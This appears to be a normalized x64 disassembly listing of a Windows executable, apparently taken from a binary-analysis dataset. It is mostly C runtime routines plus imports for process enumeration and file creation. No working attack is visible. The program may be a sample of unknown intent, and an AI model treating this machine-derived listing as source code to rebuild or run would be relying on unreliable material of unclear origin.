mov bpl [ rbx + 0x1 ]
add rbx 0x2
cmp [ rbx ] 0x58
jne r-xdata
mov r12d 0x8
jmp r-xdata
mov ebp 0x7fffffff
test sil 0x4
jne r-xdata
test r13 r13
cmovne rbx r14
xor edi edi
jmp r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or esi 0x8
cmp edi r9d
jb r-xdata
call sub_140003b30
mov [ rax ] 0x22
test sil 0x1
je r-xdata
test sil 0x1
jne r-xdata
test r13 r13
je r-xdata
imul edi r12d
add edi ecx
jne r-xdata
mov al sil
and al 0x2
neg al
sbb edi edi
neg edi
add edi ebp
or edi 0xffffffff
jmp r-xdata
mov eax esi
and eax 0x2
je r-xdata
test sil 0x2
je r-xdata
mov [ r13 ] rbx
movzx ecx bpl
movzx r8d [ r10 + rcx * 2 ]
test r8b 0x4
je r-xdata
or esi 0x4
test r13 r13
jne r-xdata
cmp ecx edx
jbe r-xdata
test eax eax
jne r-xdata
cmp edi 0x80000000
ja r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
neg edi
mov bpl [ rbx ]
inc rbx
jmp r-xdata
cmp edi ebp
jbe r-xdata
mov eax edi
jmp r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
sub_14000a1b8
sub rsp 0x38
xor eax eax
mov r9d r8d
mov r8 rdx
mov [ rsp + 0x20 ] eax
mov rdx rcx
cmp [ rw-data ] eax
jne r-xdata
xor ecx ecx
lea rcx [ rw-data ]
jmp r-xdata
call sub_140009f34
add rsp 0x38
retn
sub_14000a1e8
sub rsp 0x5a8
test [ rw-data ] 0x1
je r-xdata
call sub_140008c24
test rax rax
je r-xdata
mov ecx 0xa
call sub_140004e8c
test [ rw-data ] 0x2
je r-xdata
mov ecx 0x16
call sub_140008c30
mov ecx 0x3
call sub_140004df8
int3
lea rcx [ rsp + 0xd0 ]
call [ RtlCaptureContext@IAT ]
lea rcx [ rsp + 0x30 ]
xor edx edx
mov r8d 0x98
call sub_140005d40
mov rax [ rsp + 0x5a8 ]
xor ecx ecx
mov [ rsp + 0x40 ] rax
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x30 ] 0x40000015
mov [ rsp + 0x20 ] rax
lea rax [ rsp + 0xd0 ]
mov [ rsp + 0x28 ] rax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x20 ]
call [ UnhandledExceptionFilter@IAT ]
sub_14000a28c
sub rsp 0x38
test rcx rcx
jne r-xdata
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapSize@IAT ]
call sub_140003b30
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_140003a60
or rax 0xffffffffffffffff
jmp r-xdata
add rsp 0x38
retn
sub_14000a310
sub rsp 0x28
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
cmp rcx 0xfffffffffffffffe
je r-xdata
add rsp 0x28
retn
cmp rcx 0xfffffffffffffffe
je r-xdata
call [ CloseHandle@IAT ]
call [ CloseHandle@IAT ]
sub_14000a34c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
or edi 0xffffffff
mov rbx rcx
test rcx rcx
jne r-xdata
test [ rcx + 0x18 ] 0x83
je r-xdata
call sub_140003b30
and [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_140003a60
or eax edi
jmp r-xdata
and [ rbx + 0x18 ] 0x0
mov eax edi
call sub_140009d64
mov rcx rbx
mov edi eax
call sub_14000a738
mov rcx rbx
call sub_1400086f0
mov ecx eax
call sub_14000a620
test eax eax
jns r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
or edi 0xffffffff
jmp r-xdata
call sub_1400069d4
and [ rbx + 0x28 ] 0x0
sub_14000a3d8
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov rbx rcx
or edi 0xffffffff
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
test [ rcx + 0x18 ] 0x40
je r-xdata
call sub_140003b30
mov [ rax ] 0x16
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003a60
mov eax edi
jmp r-xdata
call sub_1400085e0
nop
mov rcx rbx
call sub_14000a34c
mov edi eax
mov rcx rbx
call sub_140008670
and [ rcx + 0x18 ] 0x0
jmp r-xdata
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov eax edi
sub_14000a450
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x30
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_140003b30
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_140003b30
mov [ rax ] 0x9
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003a60
or eax 0xffffffff
cmp edi [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov rbx rdi
mov rsi rdi
sar rsi 0x5
lea r12 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx edi
call sub_140009954
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_140003b30
mov [ rax ] 0x9
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003a60
or eax 0xffffffff
jmp r-xdata
call sub_140003b30
mov [ rax ] 0x9
or ebx 0xffffffff
mov ecx edi
call sub_1400098d0
mov rcx rax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
xor ebx ebx
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_1400099fc
mov eax ebx
jmp r-xdata
call sub_140003b50
mov [ rax ] ebx
test ebx ebx
je r-xdata
sub_14000a564
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rdi ecx
mov ecx edi
call sub_1400098d0
cmp rax 0xffffffffffffffff
je r-xdata
xor ebx ebx
mov rax [ rw-data ]
mov ecx 0x2
cmp edi 0x1
jne r-xdata
xor eax eax
mov ecx ebx
call sub_140003b70
or eax 0xffffffff
jmp r-xdata
cmp edi ecx
jne r-xdata
test [ rax + 0xb8 ] dil
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx edi
call sub_1400098d0
mov rcx rax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ rax + 0x60 ] 0x1
je r-xdata
call sub_1400098d0
mov ecx 0x1
mov rbx rax
call sub_1400098d0
cmp rax rbx
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_140009824
mov r11 rdi
mov rcx rdi
sar rcx 0x5
and r11d 0x1f
lea rdx [ rw-data ]
mov rcx [ rdx + rcx * 8 ]
imul r11 r11 0x58
mov [ rcx + r11 + 0x8 ] 0x0
test ebx ebx
je r-xdata
sub_14000a620
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
sub rsp 0x30
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
xor edi edi
cmp ebx edi
jl r-xdata
call sub_140003b50
xor edi edi
mov [ rax ] edi
call sub_140003b30
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_140003b50
mov [ rax ] edi
call sub_140003b30
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003a60
or eax 0xffffffff
cmp ebx [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
mov rsi rbx
mov r12 rbx
sar r12 0x5
lea r13 [ rw-data ]
and esi 0x1f
imul rsi rsi 0x58
mov rax [ r13 + r12 * 8 ]
movsx ecx [ rax + rsi + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx ebx
call sub_140009954
nop
mov rax [ r13 + r12 * 8 ]
test [ rax + rsi + 0x8 ] 0x1
je r-xdata
call sub_140003b50
mov [ rax ] edi
call sub_140003b30
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003a60
or eax 0xffffffff
jmp r-xdata
call sub_140003b30
mov [ rax ] 0x9
or edi 0xffffffff
mov ecx ebx
call sub_14000a564
mov edi eax
jmp r-xdata
mov ecx ebx
call sub_1400099fc
mov eax edi
jmp r-xdata
sub_14000a738
push rbx
sub rsp 0x20
test [ rcx + 0x18 ] 0x83
mov rbx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
test [ rcx + 0x18 ] 0x8
je r-xdata
mov rcx [ rcx + 0x10 ]
call sub_1400069d4
and [ rbx + 0x18 ] 0xfffffbf7
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x8 ] eax
sub_14000a7a0
sub rsp 0x10
mov [ rsp ] r10
mov [ rsp + 0x8 ] r11
xor r11 r11
lea r10 [ rsp + 0x18 ]
sub r10 rax
cmovb r10 r11
mov r11 [ gs : 0x10 ]
cmp r10 r11
jae r-xdata
mov r10 [ rsp ]
mov r11 [ rsp + 0x8 ]
add rsp 0x10
retn
and r10w 0xf000
lea r11 [ r11 - 0x1000 ]
mov [ r11 ] 0x0
cmp r10 r11
jne r-xdata
sub_140001220
mov rax [ rcx + 0x800 ]
test rax rax
jne r-xdata
cmp eax 0x186a0
jb r-xdata
xor eax eax
retn
cmp [ rax ] 0x0
je r-xdata
jmp rax
sub_1400012b0
sub rsp 0x28
call sub_140001240
xor ecx ecx
test eax eax
sete cl
mov eax ecx
add rsp 0x28
retn
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Process32FirstW
jmp [ Process32FirstW@IAT ]
Process32NextW
jmp [ Process32NextW@IAT ]
sub_140002370
cmp rcx [ rw-data ]
jne r-xdata
jmp sub_1400028a0
rol rcx 0x10
test cx 0xffff
jne r-xdata
ror rcx 0x10
retn
_start
sub rsp 0x28
call sub_140005c70
add rsp 0x28
jmp sub_1400026f4
sub_140003220
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x28
retn
mov ecx 0xfffffffd
call sub_140003028
mov [ rw-data ] 0x1
sub_1400035f0
sub rsp 0x28
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x28
jmp sub_14000680c
call [ FlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_140003750
push rbx
sub rsp 0x20
call sub_1400036cc
mov rbx rax
test rax rax
jne r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
lea ecx [ rax + 0x10 ]
call sub_140004aa4
sub_140003930
mov [ rw-data ] rcx
retn
sub_140004a8c
sub rsp 0x28
lea rcx [ sub_140004a48 ]
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
add rsp 0x28
retn
sub_140004aa4
push rbx
sub rsp 0x20
mov ebx ecx
call sub_1400050b4
mov ecx ebx
call sub_140004e8c
mov rcx [ rw-data ]
call DecodePointer
mov ecx 0xff
add rsp 0x20
pop rbx
jmp rax
sub_140004b10
push rbx
sub rsp 0x20
mov ebx ecx
call sub_140004ad4
mov ecx ebx
call [ ExitProcess@IAT ]
sub_140004b28
mov ecx 0x8
jmp sub_140006990
sub_140004b34
mov ecx 0x8
jmp sub_140006890
sub_140004dec
xor r8d r8d
xor edx edx
jmp sub_140004c60
sub_140004df8
xor r8d r8d
lea edx [ r8 + 0x1 ]
jmp sub_140004c60
sub_140004e04
xor edx edx
xor ecx ecx
lea r8d [ rdx + 0x1 ]
jmp sub_140004c60
sub_140004e14
mov edx 0x1
xor ecx ecx
mov r8d edx
jmp sub_140004c60
sub_14000529c
retn 0x0
GetCommandLineW
jmp [ GetCommandLineW@IAT ]
sub_140005d24
and [ rw-data ] 0x0
retn
sub_140005e90
sub rsp 0x28
mov r8 [ r9 + 0x38 ]
mov rcx rdx
mov rdx r9
call sub_140005e2c
mov eax 0x1
add rsp 0x28
retn
sub_140006890
movsxd rcx ecx
lea rax [ rw-data ]
add rcx rcx
mov rcx [ rax + rcx * 8 ]
jmp [ LeaveCriticalSection@IAT ]
sub_140007438
sbb rax rax
sbb rax 0xffffffffffffffff
retn
sub_1400084cc
lea rax [ rw-data ]
retn
sub_1400085b8
sub rsp 0x28
call sub_140009f1c
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
add rsp 0x28
jmp sub_1400069d4
call sub_140009cb4
sub_1400086c8
sub rsp 0x28
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
call [ LeaveCriticalSection@IAT ]
btr [ rdx + 0x18 ] 0xf
add ecx 0x10
call sub_140006890
jmp r-xdata
add rsp 0x28
retn
sub_140008760
mov rcx [ rw-data ]
xor eax eax
or rcx 0x1
cmp [ rw-data ] rcx
sete al
retn
sub_140008988
sub rsp 0x38
and [ rsp + 0x20 ] 0x0
call sub_140008778
add rsp 0x38
retn
sub_14000899c
sub rsp 0x28
call sub_140003750
mov rcx [ rax + 0xd0 ]
test rcx rcx
je r-xdata
call sub_14000a1e8
call rcx
jmp r-xdata
sub_1400089ba
add rsp 0x28
retn
sub_1400089c0
sub rsp 0x28
lea rcx [ sub_14000899c ]
call __imp_EncodePointer
mov [ rw-data ] rax
add rsp 0x28
retn
sub_140008b28
sub rsp 0x28
call sub_140008a20
neg rax
sbb eax eax
neg eax
dec eax
add rsp 0x28
retn
sub_140008c04
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
retn
sub_140008c24
mov rcx [ rw-data ]
jmp DecodePointer
sub_140008ea4
mov [ rw-data ] rcx
retn
sub_140008eac
mov [ rw-data ] rcx
retn
sub_140008eb4
mov [ rw-data ] rcx
retn
sub_140008ebc
sub rsp 0x38
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov r11d eax
mov [ rsp + 0x20 ] eax
jmp r-xdata
mov eax r11d
add rsp 0x38
retn
sub_140008ecf
cmp eax 0xc0000017
jne r-xdata
xor r11d r11d
mov [ rsp + 0x20 ] r11d
mov eax r11d
add rsp 0x38
retn
mov ecx 0x8
call [ SetLastError@IAT ]
sub_140008ef4
mov [ rw-data ] rcx
retn
sub_140009190
sub rsp 0x4d8
xor r8 r8
xor r9 r9
mov [ rsp + 0x20 ] rsp
mov [ rsp + 0x28 ] r8
call RtlUnwindEx
add rsp 0x4d8
retn
sub_1400091c0
mov [ rsp + 0x8 ] rcx
mov [ rsp + 0x18 ] rdx
mov [ rsp + 0x10 ] r8d
mov r9 0x19930520
jmp r-xdata
retn
sub_1400091f0
retn
sub_140009278
mov rax rcx
movzx edx [ rax ]
add rax 0x2
test dx dx
jne r-xdata
sub rax rcx
sar rax 0x1
dec rax
retn
sub_1400097b4
xor edx edx
lea r8d [ rdx + 0xa ]
jmp sub_14000a1b8
sub_1400099fc
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
lea rcx [ rax + rdx + 0x10 ]
jmp [ LeaveCriticalSection@IAT ]
sub_140009cac
xor r9d r9d
jmp sub_140009b38
sub_140009f1c
mov ecx 0x1
jmp sub_140009e28
sub_140009f28
mov ecx 0x2
jmp sub_140004aa4
sub_14000a2d4
sub rsp 0x48
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
mov r8d 0x3
lea rcx [ r--data ]
xor r9d r9d
mov edx 0x40000000
mov [ rsp + 0x20 ] r8d
call [ CreateFileA@IAT ]
mov [ rw-data ] rax
add rsp 0x48
retn
RtlVirtualUnwind
jmp [ RtlVirtualUnwind@IAT ]
RtlLookupFunctionEntry
jmp [ RtlLookupFunctionEntry@IAT ]
RtlUnwindEx
jmp [ RtlUnwindEx@IAT ]
sub_14000a7f0
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
mov rdx rcx
mov ecx [ rax ]
call sub_1400052a0
add rsp 0x20
pop rbp
retn
sub_14000a80c
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_140006890
add rsp 0x20
pop rbp
retn
sub_14000a825
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_140006890
add rsp 0x20
pop rbp
retn
sub_14000a83e
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_140006890
add rsp 0x20
pop rbp
retn
sub_14000a85e
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_140006890
add rsp 0x20
pop rbp
retn
sub_14000a877
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x80 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
mov ecx 0x8
call sub_140006890
sub_14000a899
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
add rsp 0x20
pop rbp
retn
sub_14000a8b5
push rbp
sub rsp 0x30
mov rbp rdx
mov ecx [ rbp + 0x60 ]
call sub_1400099fc
add rsp 0x30
pop rbp
retn
sub_14000a8cc
push rbp
sub rsp 0x20
mov rbp rdx
call sub_140004b34
add rsp 0x20
pop rbp
retn
sub_14000a8e0
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor ecx ecx
cmp [ rax ] 0xc0000005
sete cl
mov eax ecx
mov eax ecx
add rsp 0x20
pop rbp
retn
sub_14000a901
push rbp
sub rsp 0x30
mov rbp rdx
cmp [ rbp + 0x70 ] 0x0
je r-xdata
add rsp 0x30
pop rbp
retn
xor ecx ecx
call sub_140006890
sub_14000a91d
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor r11d r11d
cmp [ rax ] 0xc0000017
sete r11b
mov eax r11d
add rsp 0x20
pop rbp
retn
sub_14000a93f
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xa
call sub_140006890
add rsp 0x20
pop rbp
retn
sub_14000a958
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_140006890
add rsp 0x20
pop rbp
retn
sub_14000a971
push rbp
sub rsp 0x20
mov rbp rdx
movsxd rcx [ rbp + 0x20 ]
mov rax rcx
mov rdx [ rw-data ]
mov rdx [ rdx + rcx * 8 ]
call sub_1400086c8
add rsp 0x20
pop rbp
retn
sub_14000a9a1
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_140006890
add rsp 0x20
pop rbp
retn
sub_14000a9ba
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x40 ]
call sub_140008670
add rsp 0x30
pop rbp
retn
sub_14000a9d2
push rbp
sub rsp 0x30
mov rbp rdx
mov ecx [ rbp + 0x50 ]
call sub_1400099fc
add rsp 0x30
pop rbp
retn
